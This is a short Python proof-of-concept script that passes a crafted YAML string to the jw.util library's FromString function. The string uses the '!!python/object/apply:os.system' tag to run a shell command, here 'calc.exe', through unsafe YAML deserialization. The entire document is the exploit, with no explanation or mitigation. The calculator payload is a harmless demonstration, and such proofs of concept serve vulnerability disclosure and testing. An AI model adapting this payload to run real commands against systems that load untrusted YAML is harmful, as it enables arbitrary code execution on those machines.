import jw.util

yaml_config = """
test: !!python/object/apply:os.system ['calc.exe']
"""

jw.util.FromString(yaml_config)